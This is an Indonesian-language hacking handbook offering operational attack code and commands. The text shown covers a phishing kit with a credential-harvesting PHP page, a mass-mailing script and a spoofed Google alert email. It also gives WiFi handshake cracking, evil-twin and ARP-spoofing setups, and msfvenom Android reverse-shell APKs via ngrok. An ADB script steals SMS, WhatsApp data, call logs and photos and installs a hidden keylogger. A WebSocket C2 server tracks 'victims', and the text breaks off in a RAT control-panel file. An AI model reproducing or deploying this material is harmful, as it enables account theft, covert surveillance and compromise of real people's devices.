## **📚 BUKU PANDUAN HACKING PROFESIONAL: EDISI LENGKAP 2026**
**Semua Teknik, Tools, Script, dan Metodologi Terkini**
**Diperbarui: September 2026**

---

---

## **📋 DAFTAR ISI**

### **BAB 1: FONDASI & INFRASTRUKTUR**
- Persiapan Lingkungan: Termux & Kali Linux
- Setup Lab untuk Latihan Legal
- Manajemen Resource & Optimasi

---

### **BAB 2: OSINT & RECONNAISSANCE**
- Pengumpulan Informasi Target
- Phishing & Social Engineering Profesional
- Tools OSINT Terkini

---

### **BAB 3: SERANGAN JARINGAN WiFi**
- Wireless Reconnaissance & Packet Capture
- Password Cracking WPA2/WPA3
- Evil Twin & MITM
- Teknik WiFi Terkini 2026

---

### **BAB 4: EKSPLOITASI PERANGKAT ANDROID**
- Metasploit Android Payload Generation
- Custom Android Exploit Script
- RAT (Remote Access Trojan) Lintas Jaringan
- Spyware & Monitoring
- Reset & Destruksi Jarak Jauh

---

### **BAB 5: SERANGAN WEBSITE & DATABASE**
- SQL Injection & Database Breaches
- Web Shell Upload & Execution
- Server Compromise & Persistence
- DDoS & DoS Attack

---
### **BAB 6: SERANGAN KOMPUTER (DESKTOP/LAPTOP)**
- Metasploit Windows Exploitation
- Custom Windows Reverse Shell
- Living Off The Land (LotL)
- Token Theft & Session Hijacking

---
### **BAB 7: CCTV HACKING**
- Shodan untuk CCTV Discovery
- CCTV Exploit Script
- Akses, Kontrol, & Data Extraction

---
### **BAB 8: SPYWARE & RAT (REMOTE ACCESS TROJAN)**
- RAT Architecture
- Python RAT (Server & Client)
- Advanced RAT Features
- Deployment & Evasion

---
### **BAB 9: GMAIL & EMAIL COMPROMISE**
- Phishing Email untuk Gmail
- Brute Force Gmail dengan Hydra
- Gmail Password Extractor (Termux)
- Keylogger untuk Capture Gmail Credentials

---
### **BAB 10: PERTAHANAN BERLAPIS**
- Android Hardening
- Windows Hardening
- Firewall & IDS/IPS
- Zero Trust Architecture

---
### **BAB 11: PENETRASI PERTAHANAN**
- Windows Defender Bypass
- Linux Privilege Escalation
- Bypass Firewall & WAF

---
### **BAB 12: PENGHAPUSAN JEJAK DIGITAL**
- Log Sanitization
- Anti-Forensics
- Metadata Removal

---
### **BAB 13: TEKNIK LANJUTAN 2026**
- Cloud-Hosted C2 (Living Off The Cloud)
- Domain Fronting
- DNS Tunneling
- AI-Assisted Hacking
- Multi-Stage Payload & Dropper

---
### **BAB 14: MR. ROBOT TEKNIK (SEASON 1-4)**
- Semua Teknik dari Serial Mr. Robot

---
### **BAB 15: DISCLAIMER & ETIKA**
- Peringatan Etika & Legal

---

---
---

## **🔹 BAB 1: PERSIAPAN LINGKUNGAN (TERMUX & KALI LINUX)**

---

### **1.1 Instalasi Termux & Kali Linux (2026)**
Termux adalah terminal Android yang memberikan akses ke lingkungan Linux penuh. Kali Linux di atas Termux menggunakan `proot` untuk menciptakan environment terisolasi dengan semua tools penetration testing.

---

#### **📌 Setup Termux Lengkap**
```bash
# Update package manager
pkg update && pkg upgrade -y

# Install dependencies untuk Kali Linux
pkg install wget openssl-tool proot tar git proot-distro -y

# Install Kali Linux via proot-distro (REKOMENDASI 2026)
proot-distro install kali
proot-distro login kali

# Atau via script AnLinux (alternatif)
wget https://raw.githubusercontent.com/EXALAB/AnLinux-Resources/master/Scripts/Installer/Kali/kali.sh
bash kali.sh
./start-kali.sh
```

**Verifikasi Instalasi:**
```bash
# Di dalam Kali, test tools
apt update && apt upgrade -y
nmap --version
metasploit-framework --version
```

---

#### **📌 Tools Installation Strategy (Bertahap)**
Jangan install `kali-linux-everything` di awal — terlalu berat (~35GB). Install bertahap:

```bash
# Core tools (wajib untuk semua operasi)
apt install -y kali-tools-information-gathering  # nmap, whois, theHarvester
apt install -y kali-tools-sniffing-spoofing      # wireshark, ettercap
apt install -y kali-tools-exploitation           # metasploit framework
apt install -y kali-tools-wireless              # aircrack-ng, wifite
apt install -y kali-tools-web                   # burp suite, sqlmap
apt install -y kali-tools-passwords             # hashcat, john
```

---

#### **📌 Resource Management (Penting untuk Termux)**
Termux di Android memiliki batasan memori. Setting **swapspace** untuk operasi berat:

```bash
# Buat swap untuk mencegah crash (2GB)
fallocate -l 2G ~/swapfile
mkswap ~/swapfile
swapon ~/swapfile

# Persistent swap (tambah ke .bashrc)
echo "swapon ~/swapfile" >> ~/.bashrc
```

---
---

## **🔹 BAB 2: OSINT & RECONNAISSANCE**

---

### **2.1 Pengumpulan Informasi Target**
OSINT (Open Source Intelligence) adalah pengumpulan informasi dari sumber publik. **Fase ini paling kritis** — kesalahan di sini berarti target mendeteksi Anda.

---

#### **📌 Profil Online Mapping**
```bash
# theHarvester - ekstrak email, subdomain, IP
theHarvester -d target.com -l 500 -b google,bing,linkedin,duckduckgo

# Output:
# - Email terindeks publik
# - Subdomain aktif
# - IP range organisasi
```

**Contoh Output:**
```
[*] Searching Google...
[+] Emails found:
  - admin@target.com
  - support@target.com
[+] Hosts found:
  - mail.target.com (192.168.1.100)
  - api.target.com (192.168.1.101)
```

---

#### **📌 Reverse DNS & IP Intelligence**
```bash
# Identify IP infrastructure
whois target.com
dig target.com @8.8.8.8

# Subdomain enumeration brutal force
apt install -y dnsrecon
dnsrecon -d target.com -t brt -D /usr/share/dnsrecon/namelist.txt

# Amass (alternatif modern)
amass enum -d target.com -o subdomains.txt
```

---
#### **📌 API Intelligence (Shodan, Censys)**
```bash
# Install shodan CLI
pip install shodan

# Login dengan API key (daftar di [shodan.io](https://shodan.io))
shodan init YOUR_API_KEY

# Query untuk target
shodan host target.com
shodan search "organization:CompanyName port:22"
```

**Contoh Output:**
```
IP              Port    Service    Vulnerabilities
192.168.1.100  80     HTTP       OpenSSH 7.2p2 (CVE-2018-15473)
192.168.1.101  443    HTTPS      Apache 2.4.29 (CVE-2021-41773)
```

---
#### **📌 Social Media & Username Tracking**
```bash
# Sherlock - cari username di 300+ platform
git clone https://github.com/sherlock-project/sherlock.git
cd sherlock
python3 -m pip install -r requirements.txt
python3 sherlock.py username_target

# Holehe - cek email terdaftar di mana
holehe email@target.com

# Maigret - alternatif Sherlock
maigret username_target
```

---
#### **📌 Email Harvesting dari LinkedIn**
```bash
# Tool: linkedin2username
pip install linkedin2username

# Extract username format dari employee
python linkedin2username.py -c "CompanyName" -o employees.txt

# Format output: john.doe, jdoe, j.doe, johndoe
# Gunakan untuk brute force email: john.doe@company.com
```

---
### **2.2 Phishing & Social Engineering Profesional**
---

#### **📌 Phishing Email Template Generator (Gophish)**
Gophish adalah **phishing framework profesional** yang memungkinkan Anda membuat kampanye phishing skala besar.

**Installasi:**
```bash
# Download Gophish
wget https://github.com/gophish/gophish/releases/download/v0.12.1/gophish-v0.12.1-linux-64bit.zip
unzip gophish-v0.12.1-linux-64bit.zip
chmod +x gophish

# Config file (gophish/config.json)
{
  "phish_server": {
    "listen_url": "0.0.0.0:8080",
    "use_mod_header": false
  },
  "admin_server": {
    "listen_url": "0.0.0.0:3333"
  }
}

# Jalankan server
./gophish

# Akses panel admin: https://localhost:3333
# Default credentials: admin / gophish
```

**Cara Pakai:**
1. Buat **Sending Profile** (SMTP server untuk mengirim email).
2. Buat **Email Template** (clone halaman login Gmail, Facebook, dll).
3. Buat **Landing Page** (halaman palsu untuk capture credentials).
4. Buat **Campaign** (target email, schedule, dll).
5. **Launch Campaign** dan tunggu korban klik.

---
#### **📌 Clone Website untuk Phishing (HTTrack)**
```bash
# Install HTTrack
apt install -y httrack

# Clone target website (contoh: Gmail)
httrack https://accounts.google.com -O ./phish_site +*.css +*.js +*.png +*.jpg

# Modifikasi form login di index.html
# Arahkan form action ke server Anda:
<form action="http://attacker_server:8000/harvest.php" method="POST">
```

---
#### **📌 Phishing Landing Page (PHP)**
Simpan sebagai `harvest.php`:
```php
<?php
// harvest.php - Capture credentials
$email = $_POST['email'] ?? '';
$password = $_POST['password'] ?? '';
$ip = $_SERVER['REMOTE_ADDR'];

// Log credentials ke file
file_put_contents(
    'credentials.txt',
    "Email: $email | Password: $password | IP: $ip | Time: " . date('Y-m-d H:i:s') . "\n",
    FILE_APPEND
);

// Redirect ke halaman asli (Google, Facebook, dll)
header('Location: https://accounts.google.com');
exit;
?>
```

---
#### **📌 Campaign Delivery Script (Python)**
```python
#!/usr/bin/env python3
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

class PhishingCampaign:
    def __init__(self, smtp_server, smtp_port, email, password):
        self.smtp = smtplib.SMTP(smtp_server, smtp_port)
        self.smtp.starttls()
        self.smtp.login(email, password)
        self.sender = email

    def send_phishing_email(self, target_email, subject, html_body):
        msg = MIMEMultipart('alternative')
        msg['Subject'] = subject
        msg['From'] = self.sender
        msg['To'] = target_email

        part = MIMEText(html_body, 'html')
        msg.attach(part)

        self.smtp.sendmail(self.sender, target_email, msg.as_string())
        print(f"[+] Email sent to {target_email}")

    def mass_campaign(self, target_list_file, subject, html_file):
        with open(target_list_file, 'r') as f:
            targets = [line.strip() for line in f if line.strip()]

        with open(html_file, 'r') as f:
            html_body = f.read()

        for target in targets:
            self.send_phishing_email(target, subject, html_body)

    def close(self):
        self.smtp.quit()

# Usage
if __name__ == "__main__":
    campaign = PhishingCampaign(
        smtp_server='smtp.gmail.com',
        smtp_port=587,
        email='your_email@gmail.com',
        password='app_password_here'  # Gunakan App Password, bukan password Gmail
    )

    campaign.mass_campaign(
        target_list_file='emails.txt',
        subject='🔒 Gmail Security Alert: Verify Your Account',
        html_file='phishing_email.html'
    )

    campaign.close()
```

---
#### **📌 Contoh Email Phishing (HTML)**
Simpan sebagai `phishing_email.html`:
```html
<!DOCTYPE html>
<html>
<head>
    <title>Google Account Security Alert</title>
    <style>
        body { font-family: Arial, sans-serif; background: #f5f5f5; margin: 0; padding: 0; }
        .container { max-width: 600px; margin: 50px auto; background: white; padding: 30px; border-radius: 8px; }
        .header { text-align: center; margin-bottom: 20px; }
        .warning { background: #fff3cd; border: 1px solid #ffc107; padding: 15px; border-radius: 4px; margin-bottom: 20px; }
        .button { text-align: center; margin: 20px 0; }
        a.btn {
            background: #4285f4;
            color: white;
            padding: 12px 30px;
            text-decoration: none;
            border-radius: 4px;
            display: inline-block;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <img src="https://www.google.com/gmail/about/static/images/logo-gmail-new-20170426-mobile.png" width="100">
        </div>
        <h2>⚠️ Security Alert: Suspicious Activity Detected</h2>
        <div class="warning">
            <strong>⚠️ Warning:</strong> We detected unusual login activity on your Google account from a new device.
        </div>
        <p>Hello,</p>
        <p>We recently detected a login attempt to your Google account from a location you don't usually access from:</p>
        <ul>
            <li><strong>Location:</strong> Unknown Device (IP: 192.168.1.100)</li>
            <li><strong>Time:</strong> Just now</li>
        </ul>
        <p>For your security, we've temporarily restricted access to your account. To restore full access, please verify your identity:</p>
        <div class="button">
            <a href="http://attacker_server:8000/harvest.php" class="btn">✅ Verify Your Account Now</a>
        </div>
        <p>If this wasn't you, <a href="#">change your password immediately</a>.</p>
        <p>Thank you,<br>The Google Security Team</p>
    </div>
</body>
</html>
```

---
---
---

## **🔹 BAB 3: SERANGAN JARINGAN WiFi**

---
### **3.1 Wireless Reconnaissance & Packet Capture**
---

#### **📌 Monitor Mode Activation**
```bash
# List interfaces
iwconfig

# Enable monitor mode
airmon-ng start wlan0

# Verify ( harus Mode:Monitor )
iwconfig wlan0mon
```

---
#### **📌 WiFi Network Enumeration**
```bash
# Scan semua jaringan terdekat + signal strength
airodump-ng wlan0mon

# Output:
# BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC  CIPHER AUTH ESSID
# AA:BB:CC:DD:EE:FF  -35  100      0     0    6   54   WPA2 CCMP   PSK  MyWiFi
```

---
#### **📌 Target-Specific Packet Capture (Handshake Capture)**
```bash
# Capture handshake (EAPOL) dari target
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# Di terminal lain, lakukan deauth attack untuk memaksa client reconnect
aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF wlan0mon

# Tunggu sampai ada "WPA handshake: AA:BB:CC:DD:EE:FF" di bagian atas
# Handshake ter-capture dalam file: capture-01.cap
```

---
### **3.2 Password Cracking WPA2/WPA3**
---
#### **📌 Dictionary Attack (Aircrack-ng)**
```bash
# Crack dengan wordlist
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b AA:BB:CC:DD:EE:FF capture-01.cap

# Jika password ada di wordlist:
# KEY FOUND! [ password123 ]
```

---
#### **📌 Hashcat untuk GPU Acceleration**
```bash
# Convert .cap ke hash format (hcxpcapngtool)
hcxpcapngtool -o hash.hc22000 capture-01.cap

# Crack dengan hashcat (jauh lebih cepat)
hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt

# Mode 22000 = WPA-PBKDF2 (handshake)
# Output: password123:AA:BB:CC:DD:EE:FF
```

---
#### **📌 PMKID Attack (Tanpa Client Connect)**
```bash
# Capture PMKID langsung dari router (tanpa perlu client connect)
hcxdumptool -i wlan0mon -o capture.pcapng --enable_status=1

# Convert ke hashcat format
hcxpcapngtool capture.pcapng -o hash.hc22000

# Crack dengan hashcat
hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt
```

---
### **3.3 Evil Twin & MITM (Man-in-The-Middle)**
---
#### **📌 Create Fake WiFi Access Point (Hostapd + Dnsmasq)**
```bash
# Install hostapd & dnsmasq
apt install -y hostapd dnsmasq

# Config hostapd (hostapd.conf)
cat > hostapd.conf << 'EOF'
interface=wlan0mon
driver=nl80211
ssid=FreePublicWiFi
channel=6
hw_mode=g
wmm_enabled=1
wpa=2
wpa_passphrase=12345678
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP
EOF

# Start access point
hostapd hostapd.conf

# Config dnsmasq (dnsmasq.conf)
cat > dnsmasq.conf << 'EOF'
interface=wlan0mon
dhcp-range=192.168.1.100,192.168.1.200,255.255.255.0
dhcp-option=option:router,192.168.1.1
address=/#/192.168.1.1
EOF

# Start dnsmasq
dnsmasq -C dnsmasq.conf

# Setiap request DNS akan di-redirect ke IP Anda
# Siap untuk intercept/modify traffic
```

---
#### **📌 Packet Interception dengan Mitmproxy**
```bash
# Install mitmproxy
pip install mitmproxy

# Start proxy di port 8080
mitmproxy -p 8080

# Set firewall redirect (di host dengan route)
iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080

# Sekarang semua HTTP traffic melewati proxy Anda
# Bisa view passwords, cookies, modify responses
```

---
#### **📌 Bettercap (MITM Framework Modern)**
```bash
# Install bettercap
apt install -y bettercap

# Start bettercap
bettercap -iface wlan0

# Di dalam bettercap:
net.probe on
net.sniff on
set arp.spoof.targets 192.168.1.100
arp.spoof on
set net.sniff.output capture.pcap
```

---
### **3.4 Teknik WiFi Terkini 2026**
---
#### **📌 Bypass WPA3 Transition Mode**
```bash
# Force client connect ke WPA2 (downgrade)
berate -i wlan0 -e "WiFi Target" -c WPA2
```

---
#### **📌 WiFi Pineapple & Flipper Zero**
- **Flipper Zero**: Portable multi-tool, bisa sniff **RFID, NFC, IR, WiFi** (dengan modul).
- **WiFi Pineapple**: Rogue AP otomatis, harvest credential.
- **HackRF**: SDR untuk sniffing spektrum lebih luas.

---
---
---

## **🔹 BAB 4: EKSPLOITASI PERANGKAT ANDROID**

---
### **4.1 Metasploit Android Payload Generation**
---
#### **📌 Generate APK dengan Metasploit**
```bash
# Start Metasploit
msfconsole

# Generate Android reverse shell
use exploit/android/meterpreter/reverse_tcp
set LHOST 192.168.1.100     # IP attacker (gunakan ngrok untuk publik)
set LPORT 4444
set PAYLOAD android/meterpreter/reverse_tcp
generate -t apk -f RatApp.apk
```

**Untuk IP Publik (ngrok):**
```bash
# Start ngrok tunnel
ngrok tcp 4444

# Copy alamat forward (contoh: 0.tcp.ngrok.io:12345)
msfvenom -p android/meterpreter/reverse_tcp \
    LHOST=0.tcp.ngrok.io LPORT=12345 \
    -o payload.apk
```

---
#### **📌 Handler untuk Reverse Connection**
```bash
# Di msfconsole, setup listener
use exploit/multi/handler
set payload android/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 4444
exploit -j
```

**Setelah korban install APK:**
```bash
# Lihat session aktif
sessions -l

# Masuk ke session
sessions -i 1

# Perintah di meterpreter:
sysinfo                  # Info HP
webcam_snap              # Ambil foto
record_mic 30            # Rekam suara 30 detik
dump_sms                 # Baca SMS
dump_contacts            # Baca kontak
geolocate                # Lokasi GPS
shell                    # Shell Android
```

---
### **4.2 Custom Android Exploit Script (Python)**
Script berikut menggunakan **ADB (Android Debug Bridge)** untuk kontrol perangkat yang sudah **rooted** atau **debugging enabled**.

---
#### **📌 Script: `android_exploit.py`**
```python
#!/usr/bin/env python3
import subprocess
import time
import sys
import sqlite3
import os

class AndroidExploit:
    def __init__(self, device_ip, port=5555):
        self.device = f"{device_ip}:{port}"
        self.adb = "adb"
        self.connect_device()

    def connect_device(self):
        """Connect ke Android device via ADB over network"""
        result = subprocess.run(
            [self.adb, "connect", self.device],
            capture_output=True,
            text=True
        )
        if "connected" in result.stdout:
            print(f"[+] Connected to {self.device}")
        else:
            print(f"[-] Connection failed: {result.stderr}")
            sys.exit(1)

    def execute_command(self, cmd):
        """Execute command di Android device"""
        result = subprocess.run(
            [self.adb, "-s", self.device, "shell", cmd],
            capture_output=True,
            text=True
        )
        return result.stdout.strip()

    def get_device_info(self):
        """Extract device information"""
        info = {}
        info['model'] = self.execute_command("getprop ro.product.model")
        info['android_version'] = self.execute_command("getprop ro.build.version.release")
        info['serial'] = self.execute_command("getprop ro.serialno")
        info['imei'] = self.execute_command("service call iphonesubinfo 1 | grep -o '[0-9a-f]\\{2\\}' | tail -15 | sed 's/^/0x/' | xargs printf '%d' | sed 's/./ & /g'")
        return info

    def get_installed_apps(self):
        """List installed applications (third-party only)"""
        result = self.execute_command("pm list packages -3")
        return result.split('\n') if result else []

    def extract_sms(self, output_file="sms.db"):
        """Extract SMS messages"""
        db_path = "/data/data/com.android.providers.telephony/databases/mmssms.db"
        self.execute_command(f"cp {db_path} /sdcard/messages.db")
        self.execute_command("chmod 644 /sdcard/messages.db")

        # Pull ke attacker machine
        subprocess.run(
            [self.adb, "-s", self.device, "pull", "/sdcard/messages.db", output_file],
            capture_output=True
        )

        print(f"[+] SMS database extracted to {output_file}")

        # Parse dengan sqlite3
        if os.path.exists(output_file):
            conn = sqlite3.connect(output_file)
            cursor = conn.cursor()
            cursor.execute("SELECT address, body, date FROM sms")
            sms_data = cursor.fetchall()
            conn.close()
            return sms_data
        return []

    def extract_whatsapp_messages(self, output_file="wa_backup.db"):
        """Extract WhatsApp database (jika backup tidak terenkripsi)"""
        wa_db = "/data/data/com.whatsapp/databases/msgstore.db"
        backup_db = "/data/data/com.whatsapp/databases/msgstore.db.crypt12"

        # Force backup (jika device tidak otomatis backup)
        self.execute_command("am broadcast -a com.whatsapp.Backup")
        time.sleep(5)

        # Copy backup
        self.execute_command(f"cp {backup_db} /sdcard/wa_backup.db")
        self.execute_command("chmod 644 /sdcard/wa_backup.db")

        # Pull ke attacker
        subprocess.run(
            [self.adb, "-s", self.device, "pull", "/sdcard/wa_backup.db", output_file],
            capture_output=True
        )
        print(f"[+] WhatsApp data extracted to {output_file}")

    def extract_call_logs(self):
        """Extract call history"""
        result = self.execute_command(
            "sqlite3 /data/data/com.android.providers.contacts/databases/contacts2.db "
            '"SELECT number, type, duration, date FROM calls"'
        )
        return result.split('\n') if result else []

    def extract_photos(self, output_dir="./extracted_photos"):
        """Extract photos dari galeri"""
        os.makedirs(output_dir, exist_ok=True)
        self.execute_command("chmod 777 /sdcard/DCIM/Camera")
        subprocess.run(
            [self.adb, "-s", self.device, "pull", "/sdcard/DCIM/Camera/", output_dir],
            capture_output=True
        )
        print(f"[+] Photos extracted to {output_dir}")

    def install_payload(self, apk_path):
        """Install APK (malicious atau legitimate)"""
        result = subprocess.run(
            [self.adb, "-s", self.device, "install", apk_path],
            capture_output=True,
            text=True
        )
        if "Success" in result.stdout:
            print(f"[+] APK installed: {apk_path}")
            return True
        else:
            print(f"[-] Installation failed: {result.stdout}")
            return False

    def launch_app(self, package_name):
        """Launch installed app"""
        activity = self.execute_command(
            f"cmd package resolve-activity --brief {package_name} | tail -1"
        )
        if activity:
            self.execute_command(f"am start -n {package_name}/{activity}")
            print(f"[+] Launched {package_name}")

    def enable_keylogger(self):
        """Install hidden keylogger (memerlukan root)"""
        # Push keylogger script
        keylogger_script = """
#!/bin/bash
while true; do
    logcat -v threadtime INPUT_LOG >> /sdcard/.hidden_keylog
    sleep 1
done
"""
        with open('/tmp/keylogger.sh', 'w') as f:
            f.write(keylogger_script)

        subprocess.run(
            [self.adb, "-s", self.device, "push", "/tmp/keylogger.sh", "/data/local/tmp/"],
            capture_output=True
        )
        self.execute_command("chmod +x /data/local/tmp/keylogger.sh")
        self.execute_command("su -c 'sh /data/local/tmp/keylogger.sh &'")
        print("[+] Keylogger activated (background)")

    def get_location(self):
        """Get GPS location"""
        return self.execute_command("dumpsys location | grep -A5 'gps'")

    def access_camera(self):
        """Take photo using device camera"""
        self.execute_command("am start -a android.media.action.STILL_IMAGE_CAMERA_SECURE")
        time.sleep(2)
        self.execute_command("input keyevent 27")  # Capture button
        print("[+] Photo capture triggered")

    def cleanup(self):
        """Remove traces"""
        self.execute_command("rm -rf /sdcard/.hidden_keylog")
        print("[+] Cleanup completed")

# Usage
if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 android_exploit.py <device_ip> [port]")
        sys.exit(1)

    device_ip = sys.argv[1]
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 5555

    exploit = AndroidExploit(device_ip, port)

    # Gathering phase
    print("\n[*] Device Information:")
    info = exploit.get_device_info()
    for key, value in info.items():
        print(f"    {key}: {value}")

    # Data extraction
    print("\n[*] Installed Apps:")
    apps = exploit.get_installed_apps()
    print(f"    Total: {len(apps)}")

    print("\n[*] Extracting SMS...")
    sms = exploit.extract_sms()
    for msg in sms[:5]:  # Show first 5
        print(f"    {msg[0]}: {msg[1][:50]}...")

    print("\n[*] Extracting Call Logs...")
    calls = exploit.extract_call_logs()
    print(f"    Total calls: {len(calls)}")

    print("\n[*] Extracting Photos...")
    exploit.extract_photos()

    # print("\n[*] Enabling Keylogger (requires root)...")
    # exploit.enable_keylogger()  # Uncomment jika device rooted
```

---
#### **📌 Cara Pakai Script:**
1. **Pastikan ADB terinstall** di Kali/Termux:
   ```bash
   apt install -y android-tools-adb  # Kali
   pkg install android-tools        # Termux
   ```
2. **Aktifkan USB Debugging** di Android:
   - `Settings > About Phone > Tap Build Number 7x` (untuk enable Developer Options).
   - `Settings > Developer Options > Enable USB Debugging`.
3. **Connect via USB atau WiFi**:
   ```bash
   adb devices  # Cek koneksi
   adb tcpip 5555  # Enable ADB over WiFi
   adb connect 192.168.1.100:5555  # Ganti dengan IP Android
   ```
4. **Jalankan Script**:
   ```bash
   python3 android_exploit.py 192.168.1.100
   ```

---
### **4.3 RAT (Remote Access Trojan) Lintas Jaringan**
---
#### **📌 Arsitektur RAT Modern (2026)**
RAT modern untuk Android **bisa bekerja lintas jaringan/wilayah** asalkan:
1. **Payload connect ke C2 (Command & Control) server** yang reachable dari internet publik.
2. **C2 server punya alamat publik** (IP VPS, domain, atau tunneling service).

**Skenario:**
```
[Korban HP] ←── WebSocket/HTTPS ──→ [VPS C2] ←── Web Panel ──→ [Browser Kamu]
     ↓
  Accessibility Services (Keylogger, Anti-Uninstall)
  Screen Streaming (Real-Time)
  GPS/Location Tracking
```

---
#### **📌 Solusi untuk Lintas Jaringan/Wilayah**
| Masalah | Solusi | Keunggulan | Kekurangan |
|---------|--------|-----------|------------|
| **IP lokal tidak bisa di-reach** | VPS/Cloud Server | Stabil, 24/7 | Berbayar (~$5/bulan) |
| **Tidak punya VPS** | Tunneling (ngrok, Cloudflare) | Gratis | Lambat, tidak stabil |
| **Firewall-blocked** | Domain Fronting (CDN) | Stealth | Kompleks |
| **Deteksi AV** | Obfuscation + Polymorphism | Bypass AV | Butuh update terus |

---
##### **🔹 Solusi 1: VPS/Cloud Server (REKOMENDASI)**
**Langkah:**
1. Sewa VPS (DigitalOcean, Vultr, Linode, AWS Lightsail).
2. Install C2 server di VPS.
3. Payload connect ke **IP VPS** (reachable dari mana saja).

**Contoh VPS Setup (Ubuntu):**
```bash
# Update & install dependencies
apt update && apt install -y python3 python3-pip git

# Install C2 server (contoh: WebSocket C2)
pip3 install websockets
git clone https://github.com/your-repo/websocket-c2.git
cd websocket-c2
python3 c2_server.py
```

---
##### **🔹 Solusi 2: Tunneling Service (Gratis)**
**Ngrok (TCP Tunneling):**
```bash
# Install ngrok
wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip  # Termux
unzip ngrok-stable-linux-arm.zip
cp ngrok /data/data/com.termux/files/usr/bin/

# Start tunnel
ngrok tcp 4444

# Output: Forwarding tcp://0.tcp.ngrok.io:12345 -> localhost:4444
# Payload connect ke: 0.tcp.ngrok.io:12345
```

**Cloudflare Tunnel (Lebih Stealth):**
```bash
# Install cloudflared
wget https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm
chmod +x cloudflared-linux-arm

# Auth & create tunnel
./cloudflared-linux-arm tunnel login
./cloudflared-linux-arm tunnel create c2-tunnel
./cloudflared-linux-arm tunnel route dns c2-tunnel c2.yourdomain.com
```

---
##### **🔹 Solusi 3: Port Forwarding di Router**
Jika punya **IP Publik Static** dan akses router:
```bash
# Forward port 4444 ke IP lokal HP
# Contoh di router (tergantung merek):
# External Port: 4444 → Internal IP: 192.168.1.100 → Internal Port: 4444
```

---
#### **📌 WebSocket C2 Server (Python)**
**File: `c2_server.py`**
```python
#!/usr/bin/env python3
"""
WebSocket C2 Server — RAT Android
Jalan di VPS. Handle multiple korban.
"""
import asyncio
import websockets
import json
import sqlite3
import datetime
import base64
import os

# Setup database
db = sqlite3.connect('rat.db', check_same_thread=False)
cursor = db.cursor()
cursor.execute("""
    CREATE TABLE IF NOT EXISTS victims (
        id TEXT PRIMARY KEY,
        model TEXT,
        android_version TEXT,
        ip TEXT,
        first_seen TEXT,
        last_seen TEXT,
        status TEXT
    )
""")
db.commit()

connected = {}  # Simpan koneksi aktif

async def handle_client(websocket, path):
    victim_id = None
    try:
        async for message in websocket:
            try:
                data = json.loads(message)
            except:
                continue

            msg_type = data.get('type')

            if msg_type == 'register':
                victim_id = data.get('device_id')
                connected[victim_id] = websocket

                cursor.execute("""
                    INSERT OR REPLACE INTO victims
                    (id, model, android_version, ip, first_seen, last_seen, status)
                    VALUES (?, ?, ?, ?, ?, ?, ?)
                """, (
                    victim_id,
                    data.get('model', 'Unknown'),
                    data.get('android_version', 'Unknown'),
                    websocket.remote_address[0],
                    datetime.datetime.now().isoformat(),
                    datetime.datetime.now().isoformat(),
                    'online'
                ))
                db.commit()
                print(f"[+] Korban connect: {victim_id}")
                print(f"    Model: {data.get('model')}")
                print(f"    IP: {websocket.remote_address[0]}")

            elif msg_type == 'heartbeat':
                if victim_id:
                    cursor.execute("""
                        UPDATE victims
                        SET last_seen=?, status='online'
                        WHERE id=?
                    """, (datetime.datetime.now().isoformat(), victim_id))
                    db.commit()

            elif msg_type == 'data':
                category = data.get('category')
                content = data.get('content')
                filename = f"data/{victim_id}_{category}_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
                os.makedirs('data', exist_ok=True)
                with open(filename, 'w') as f:
                    json.dump(content, f, indent=2)
                print(f"[+] Data diterima dari {victim_id}: {category}")

            elif msg_type == 'screen_frame':
                frame = data.get('frame')
                if frame:
                    img_data = base64.b64decode(frame)
                    os.makedirs('screens', exist_ok=True)
                    with open(f"screens/{victim_id}_latest.jpg", 'wb') as f:
                        f.write(img_data)

            elif msg_type == 'location':
                lat = data.get('lat')
                lon = data.get('lon')
                print(f"[+] Lokasi {victim_id}: {lat}, {lon}")
                print(f"    Maps: https://maps.google.com/?q={lat},{lon}")
                cursor.execute("UPDATE victims SET last_seen=? WHERE id=?", (
                    datetime.datetime.now().isoformat(), victim_id
                ))
                db.commit()

    except websockets.exceptions.ConnectionClosed:
        if victim_id and victim_id in connected:
            del connected[victim_id]
            cursor.execute("UPDATE victims SET status='offline' WHERE id=?", (victim_id,))
            db.commit()
            print(f"[-] Korban disconnect: {victim_id}")

async def send_command(victim_id, command):
    if victim_id in connected:
        await connected[victim_id].send(json.dumps(command))
        return True
    return False

async def main():
    async with websockets.serve(handle_client, "0.0.0.0", 8080):
        print("=" * 50)
        print("  RAT C2 Server — Port 8080")
        print("  WebSocket aktif, menunggu korban...")
        print("=" * 50)
        await asyncio.Future()  # Run forever

if __name__ == "__main__":
    asyncio.run(main())
```

**Jalankan di VPS:**
```bash
python3 c2_server.py
```

---
#### **📌 Web Panel Monitoring (PHP)**
**File: `panel.php`**
```php
<?php
session_start();

if (!isset($_SESSION['auth'])) {
    if ($_POST['key'] === 'KUNCI_RAHASIA_KAMU') {
        $_SESSION['auth'] = true;
    } else {
        die('<form method="post"><input type="password" name="key" placeholder="Key"><input type="submit" value="Login"></form>');
    }
}

$db = new SQLite3('rat.db');
$results = $db->query("SELECT * FROM victims ORDER BY last_seen DESC");

echo "<h1>RAT Panel — Korban Online</h1>";
echo "<table border='1' cellpadding='10'>";
echo "<tr><th>ID</th><th>Model</th><th>Android</th><th>IP</th><th>Status</th><th>Last Seen</th><th>Aksi</th></tr>";

while ($row = $results->fetchArray(SQLITE3_ASSOC)) {
    $status_color = $row['status'] === 'online' ? 'green' : 'red';
    echo "<tr>";
    echo "<td>{$row['id']}</td>";
    echo "<td>{$row['model']}</td>";
    echo "<td>{$row['android_version']}</td>";
